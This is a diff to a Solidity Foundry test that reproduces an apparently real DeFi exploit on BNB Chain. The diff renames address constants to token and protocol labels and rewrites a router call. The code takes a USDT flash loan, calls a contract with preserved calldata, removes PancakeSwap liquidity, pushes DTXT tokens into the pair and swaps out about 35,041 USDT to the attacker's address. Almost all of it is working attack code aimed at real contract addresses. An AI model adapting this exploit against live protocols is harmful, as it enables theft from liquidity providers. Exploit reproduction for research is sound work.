@@ -67,17 +67,13 @@ contract AttackTest is LumosPoCBase {
     function _expectOutcome(address attack, address helper) internal {
         attack;
         helper;
-        _expectProfit(
-            LumosAddresses.attack_contract, attack, LumosAddresses.A_AC9BF7_97D2, "UNKNOWN", 350143770445824996500
-        );
-        _expectProfit(
-            LumosAddresses.attacker_eoa, address(0), LumosAddresses.A_55D398_7955, "UNKNOWN", 35041106262669601832715
-        );
+        _expectProfit(LumosAddresses.attack_contract, attack, LumosAddresses.DTXT, "DTXT", 350143770445824996500);
+        _expectProfit(LumosAddresses.attacker_eoa, address(0), LumosAddresses.USDT, "USDT", 35041106262669601832715);
         economicOracles.push(
             EconomicOracle(
-                LumosAddresses.A_90BFC1_6C01,
-                LumosAddresses.A_55D398_7955,
-                "UNKNOWN",
+                LumosAddresses.Cake_LP,
+                LumosAddresses.USDT,
+                "USDT",
                 "victim_loss",
                 false,
                 35041106262669601832715,
@@ -87,8 +83,8 @@ contract AttackTest is LumosPoCBase {
         economicOracles.push(
             EconomicOracle(
                 LumosAddresses.A_D2453F_5428,
-                LumosAddresses.A_AC9BF7_97D2,
-                "UNKNOWN",
+                LumosAddresses.DTXT,
+                "DTXT",
                 "victim_loss",
                 false,
                 359121820445999996500000000,
@@ -108,72 +104,73 @@ contract OurAttack {
 
     function flashCallback() internal {
         _markCallback(0);
-        IERC20Like(LumosAddresses.A_55D398_7955).approve(LumosAddresses.A_D2453F_5428, type(uint256).max);
+        IERC20Like(LumosAddresses.USDT).approve(LumosAddresses.A_D2453F_5428, type(uint256).max);
         {
             bytes memory observedCallData =
                 hex"1f89d93b000000000000000000000000000000000000000001290f0aa1370fff60ad80000000000000000000000000000000000000000000000000000000000000000000"; // artifact calldata preserved: pseudocode raw_call action_0001 line 54 requires exact artifact calldata
             (bool ok,) = LumosAddresses.A_D2453F_5428.call(observedCallData);
             require(ok, "observed selector 0x1f89d93b failed");
         }
-        IERC20Like(LumosAddresses.A_AC9BF7_97D2).balanceOf(address(this));
+        IERC20Like(LumosAddresses.DTXT).balanceOf(address(this));
         LumosHarness.vmExt()
             .store(LumosAddresses.attack_contract, bytes32(uint256(3)), bytes32(uint256(179560820442499996500000000)));
-        IERC20Like(LumosAddresses.A_90BFC1_6C01).balanceOf(address(this));
-        uint256 a90bfc16c01ApproveAllowance = type(uint256).max; // value provenance: arg1=type(uint256).max is covered by prior LumosAddresses.A_90BFC1_6C01.balanceOf(address) return=13908735252838108500522252 with args (address(this))
-        IERC20Like(LumosAddresses.A_90BFC1_6C01).approve(LumosAddresses.A_10ED43_024E, a90bfc16c01ApproveAllowance);
-        {
-            bytes memory observedCallData =
-                hex"baa2abde00000000000000000000000055d398326f99059ff775485246999027b3197955000000000000000000000000ac9bf7c320d4ce2d0ac978b83955dd67351897d20000000000000000000000000000000000000000000b814a0c83929bef76f50c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003065bc8ed8bd53bdc3fd4633c3097c40726b5f5f000000000000000000000000000000000000000000000000000000006a2296e2"; // artifact calldata preserved: pseudocode raw_call action_0006 line 61 requires exact artifact calldata
-            (bool ok,) = LumosAddresses.A_10ED43_024E.call(observedCallData);
-            require(ok, "observed selector 0xbaa2abde failed");
-        }
-        uint256 aAc9bf797d2BalanceOfAttackAttackContract =
-            IERC20Like(LumosAddresses.A_AC9BF7_97D2).balanceOf(address(this));
+        uint256 cakeLpBalanceOfAttackAttackContract = IERC20Like(LumosAddresses.Cake_LP).balanceOf(address(this));
+        uint256 cakeLpApproveAllowance = type(uint256).max; // value provenance: arg1=type(uint256).max is covered by prior LumosAddresses.Cake_LP.balanceOf(address) return=13908735252838108500522252 with args (address(this))
+        IERC20Like(LumosAddresses.Cake_LP).approve(LumosAddresses.PancakeRouter, cakeLpApproveAllowance);
+        IPancakeRouter(LumosAddresses.PancakeRouter)
+            .removeLiquidity(
+                LumosAddresses.USDT,
+                LumosAddresses.DTXT,
+                cakeLpBalanceOfAttackAttackContract,
+                0,
+                0,
+                address(this),
+                1780651746
+            );
+        uint256 dtxtBalanceOfAttackAttackContract = IERC20Like(LumosAddresses.DTXT).balanceOf(address(this));
         LumosHarness.vmExt()
             .store(LumosAddresses.attack_contract, bytes32(uint256(4)), bytes32(uint256(170582950003325000000000000)));
         {
             LumosHarness.vmExt().startPrank(address(this)); // artifact token-call sender context token_call_32574: preserve observed ERC20 msg.sender/holder exactly; missing balance is a producer-flow gap, not a current-holder fallback
-            IERC20Like(LumosAddresses.A_55D398_7955).transfer(LumosAddresses.A_90BFC1_6C01, 1);
+            IERC20Like(LumosAddresses.USDT).transfer(LumosAddresses.Cake_LP, 1);
 
             LumosHarness.vmExt().stopPrank();
         }
-        uint256 aAc9bf797d2BalanceOfAttackAttackContract_2 =
-            IERC20Like(LumosAddresses.A_AC9BF7_97D2).balanceOf(address(this));
-        IERC20Like(LumosAddresses.A_AC9BF7_97D2)
-            .transfer(LumosAddresses.A_90BFC1_6C01, aAc9bf797d2BalanceOfAttackAttackContract_2);
-        IERC20Like(LumosAddresses.A_AC9BF7_97D2).balanceOf(address(this));
+        uint256 dtxtBalanceOfAttackAttackContract_2 = IERC20Like(LumosAddresses.DTXT).balanceOf(address(this));
+        IERC20Like(LumosAddresses.DTXT).transfer(LumosAddresses.Cake_LP, dtxtBalanceOfAttackAttackContract_2);
+        IERC20Like(LumosAddresses.DTXT).balanceOf(address(this));
         LumosHarness.vmExt()
             .store(LumosAddresses.attack_contract, bytes32(uint256(6)), bytes32(uint256(350143770445824996500)));
-        IERC20Like(LumosAddresses.A_55D398_7955).balanceOf(LumosAddresses.A_90BFC1_6C01);
-        IERC20Like(LumosAddresses.A_AC9BF7_97D2).balanceOf(LumosAddresses.A_90BFC1_6C01);
-        IERC20Like(LumosAddresses.A_55D398_7955).balanceOf(address(this));
-        IUniswapV2PairLike(LumosAddresses.A_90BFC1_6C01).swap(35041106262669601832717, 0, address(this), hex"");
-        IERC20Like(LumosAddresses.A_55D398_7955).balanceOf(address(this));
+        ICake_LP(LumosAddresses.Cake_LP).getReserves();
+        IERC20Like(LumosAddresses.USDT).balanceOf(LumosAddresses.Cake_LP);
+        IERC20Like(LumosAddresses.DTXT).balanceOf(LumosAddresses.Cake_LP);
+        IERC20Like(LumosAddresses.USDT).balanceOf(address(this));
+        uint256 cakeLpSwapAmount = 35041106262669601832717; // value provenance: arg0=35041106262669601832717 is covered by prior LumosAddresses.Cake_LP.balanceOf(address) return=13908735252838108500522252 with args (address(this))
+        IUniswapV2PairLike(LumosAddresses.Cake_LP).swap(cakeLpSwapAmount, 0, address(this), hex"");
+        IERC20Like(LumosAddresses.USDT).balanceOf(address(this));
         LumosHarness.vmExt()
             .store(LumosAddresses.attack_contract, bytes32(uint256(5)), bytes32(uint256(35041106262669601832717)));
-        uint256 a55d3987955ApproveAllowance = 1077366001021000000000000; // value provenance: arg1=1077366001021000000000000 is covered by prior LumosAddresses.A_55D398_7955.balanceOf(address) return=1112407107283669601832715 with args (address(this))
-        IERC20Like(LumosAddresses.A_55D398_7955).approve(LumosAddresses.A_8F73B6_5D8C, a55d3987955ApproveAllowance);
+        uint256 usdtApproveAllowance = 1077366001021000000000000; // value provenance: arg1=1077366001021000000000000 is covered by prior LumosAddresses.USDT.balanceOf(address) return=1112407107283669601832715 with args (address(this))
+        IERC20Like(LumosAddresses.USDT).approve(LumosAddresses.ERC1967Proxy, usdtApproveAllowance);
     }
 
     function _attack() internal {
-        IERC20Like(LumosAddresses.A_55D398_7955).balanceOf(LumosAddresses.A_90BFC1_6C01);
-        IERC20Like(LumosAddresses.A_AC9BF7_97D2).balanceOf(LumosAddresses.A_90BFC1_6C01);
+        IERC20Like(LumosAddresses.USDT).balanceOf(LumosAddresses.Cake_LP);
+        IERC20Like(LumosAddresses.DTXT).balanceOf(LumosAddresses.Cake_LP);
         LumosHarness.vmExt()
             .store(LumosAddresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1077366001021000000000000)));
         LumosHarness.vmExt()
             .store(LumosAddresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(359122000007000000000000000)));
         {
             bytes memory flashLoanProof = abi.encode(0x000000000000000001290f0aa1370Fff60AD8000);
-            IContract_8F73B6_5D8C(LumosAddresses.A_8F73B6_5D8C)
-                .flashLoan(LumosAddresses.A_55D398_7955, 1077366001021000000000000, flashLoanProof);
+            IERC1967Proxy(LumosAddresses.ERC1967Proxy)
+                .flashLoan(LumosAddresses.USDT, 1077366001021000000000000, flashLoanProof);
         }
         LumosHarness.vmExt().store(LumosAddresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
-        uint256 a55d3987955BalanceOfAttackAttackContract =
-            IERC20Like(LumosAddresses.A_55D398_7955).balanceOf(address(this));
+        uint256 usdtBalanceOfAttackAttackContract = IERC20Like(LumosAddresses.USDT).balanceOf(address(this));
         LumosHarness.vmExt()
             .store(LumosAddresses.attack_contract, bytes32(uint256(1)), bytes32(uint256(35041106262669601832715)));
-        IERC20Like(LumosAddresses.A_55D398_7955)
-            .transfer(LumosAddresses.attacker_eoa, a55d3987955BalanceOfAttackAttackContract);
+        IERC20Like(LumosAddresses.USDT).transfer(LumosAddresses.attacker_eoa, usdtBalanceOfAttackAttackContract);
     }
 
     receive() external payable {}
@@ -287,19 +284,27 @@ interface VmExt {
 
 library LumosAddresses {
     address internal constant ZERO = address(0);
-    address internal constant A_10ED43_024E = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // LumosAddresses.A_10ED43_024E = 0x10ed43c718714eb63d5aa57b78b54704e256024e label=unresolved roles=attack_address|recipient|sender|storage_contract source=unresolved confidence=low
+    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // LumosAddresses.PancakeRouter = 0x10ed43c718714eb63d5aa57b78b54704e256024e label=PancakeRouter roles=attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
     address internal constant attack_contract = 0x3065bc8ed8BD53BDc3Fd4633c3097C40726b5f5f; // address(this) = 0x3065bc8ed8bd53bdc3fd4633c3097c40726b5f5f label=attack_contract roles=asset|attacker_callback_contract|attacker_contract|attacker_entry_contract|code_contract|contract|economic_holder|localized_contract|attack_address|profit_holder|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
-    address internal constant A_55D398_7955 = 0x55d398326f99059fF775485246999027B3197955; // LumosAddresses.A_55D398_7955 = 0x55d398326f99059ff775485246999027b3197955 label=unresolved roles=asset|contract|economic_asset|attack_address|profit_asset|recipient source=unresolved confidence=low
-    address internal constant A_8F73B6_5D8C = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C; // LumosAddresses.A_8F73B6_5D8C = 0x8f73b65b4caaf64fba2af91cc5d4a2a1318e5d8c label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low
-    address internal constant A_90BFC1_6C01 = 0x90BfC1dBc878bA54858bA8A635B3DAebd2aC6c01; // LumosAddresses.A_90BFC1_6C01 = 0x90bfc1dbc878ba54858ba8a635b3daebd2ac6c01 label=unresolved roles=asset|contract|economic_holder|attack_address|recipient|sender|storage_contract source=unresolved confidence=low
-    address internal constant A_AC9BF7_97D2 = 0xAc9Bf7C320d4cE2D0ac978B83955Dd67351897D2; // LumosAddresses.A_AC9BF7_97D2 = 0xac9bf7c320d4ce2d0ac978b83955dd67351897d2 label=unresolved roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract source=unresolved confidence=low
+    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955; // LumosAddresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=BEP20USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
+    address internal constant ERC1967Proxy = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C; // LumosAddresses.ERC1967Proxy = 0x8f73b65b4caaf64fba2af91cc5d4a2a1318e5d8c label=ERC1967Proxy roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
+    address internal constant Cake_LP = 0x90BfC1dBc878bA54858bA8A635B3DAebd2aC6c01; // LumosAddresses.Cake_LP = 0x90bfc1dbc878ba54858ba8a635b3daebd2ac6c01 label=PancakePair token_symbol=Cake-LP roles=asset|contract|economic_holder|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
+    address internal constant DTXT = 0xAc9Bf7C320d4cE2D0ac978B83955Dd67351897D2; // LumosAddresses.DTXT = 0xac9bf7c320d4ce2d0ac978b83955dd67351897d2 label=DTXT token_symbol=DTXT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=etherscan_v2 confidence=high
     address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; // LumosAddresses.BalancerVault = 0xba12222222228d8ba445958a75a0704d566bf2c8 label=BalancerVault roles=known_protocol source=poc_sketch.known_addresses confidence=high
-    address internal constant A_D2453F_5428 = 0xd2453Ff82E1C5b568dDB260f1f0bb95169895428; // LumosAddresses.A_D2453F_5428 = 0xd2453ff82e1c5b568ddb260f1f0bb95169895428 label=unresolved roles=economic_holder|attack_address|recipient|sender|storage_contract source=unresolved confidence=low
+    address internal constant A_D2453F_5428 = 0xd2453Ff82E1C5b568dDB260f1f0bb95169895428; // LumosAddresses.A_D2453F_5428 = 0xd2453ff82e1c5b568ddb260f1f0bb95169895428 label=0xd2453ff82e1c5b568ddb260f1f0bb95169895428 roles=economic_holder|attack_address|recipient|sender|storage_contract source=asset_delta.profit_candidates confidence=medium
     address internal constant attacker_eoa = 0xd304ea1592f733e0A46436A01fe54bD504009526; // LumosAddresses.attacker_eoa = 0xd304ea1592f733e0a46436a01fe54bd504009526 label=attacker_eoa roles=attacker_eoa|contract|economic_holder|attack_address|profit_holder|recipient|sender source=tx_metadata.from confidence=high
 }
 
-interface IContract_8F73B6_5D8C {
+interface ICake_LP {
+    function getReserves() external view;
+}
+
+interface IERC1967Proxy {
     function flashLoan(address, uint256, bytes calldata) external;
+}
+
+interface IPancakeRouter {
+    function removeLiquidity(address, address, uint256, uint256, uint256, address, uint256) external;
 }
 
 interface IUniswapV2PairLike {
